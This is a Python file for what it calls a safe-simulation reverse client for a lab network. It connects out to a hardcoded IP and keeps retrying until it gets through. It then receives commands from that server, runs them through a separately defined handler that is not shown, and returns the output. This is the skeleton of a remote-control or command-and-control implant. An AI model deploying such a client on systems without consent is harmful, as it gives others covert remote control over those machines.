#!/usr/bin/env python3
"""
Reverse client (simulación segura).
Edit SERVER_HOST and SERVER_PORT al inicio si necesitas apuntar a otro servidor.
Ejecutar: python client.py
"""
import socket
import json
import time
from command_handler import CommandHandler

# Cambia aquí la dirección del servidor si es necesario (client está hard-coded por requisitos)
SERVER_HOST = '172.20.202.179'  # cambiar por la IP del servidor en la red de laboratorio
SERVER_PORT = 9000

class Client:
    def __init__(self, server_host=SERVER_HOST, server_port=SERVER_PORT):
        self.server_host = server_host
        self.server_port = server_port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.buf = b""
        self.handler = CommandHandler()

    def connect(self):
        print(f"Connecting to {self.server_host}:{self.server_port}...")
        self.sock.connect((self.server_host, self.server_port))
        print("Connected to server")
        self.loop()

    def send(self, obj: dict):
        self.sock.sendall((json.dumps(obj) + "\n").encode('utf-8'))

    def recv_message(self):
        while b"\n" not in self.buf:
            chunk = self.sock.recv(4096)
            if not chunk:
                return None
            self.buf += chunk
        line, sep, rest = self.buf.partition(b"\n")
        self.buf = rest
        return json.loads(line.decode('utf-8'))

    def loop(self):
        try:
            while True:
                msg = self.recv_message()
                if msg is None:
                    print("Server disconnected")
                    break
                # Process only messages of type 'command'
                if msg.get('type') != 'command':
                    continue
                cmd = msg.get('command')
                cid = msg.get('id')
                payload = msg.get('payload', {})
                result = self.handler.handle(cmd, payload)
                response = {
                    'type': 'response',
                    'id': cid,
                    'status': 'ok' if result['ok'] else 'error',
                    'output': result.get('output', ''),
                    'meta': result.get('meta', {})
                }
                self.send(response)
        except KeyboardInterrupt:
            print('\nInterrupted. Exiting.')
        finally:
            self.sock.close()

if __name__ == '__main__':
    # Bucle de reconexión básico
    client = Client()
    while True:
        try:
            client.connect()
            break
        except Exception as e:
            print("Connection failed:", e)
            print("Retrying in 5 seconds...")
            time.sleep(5)
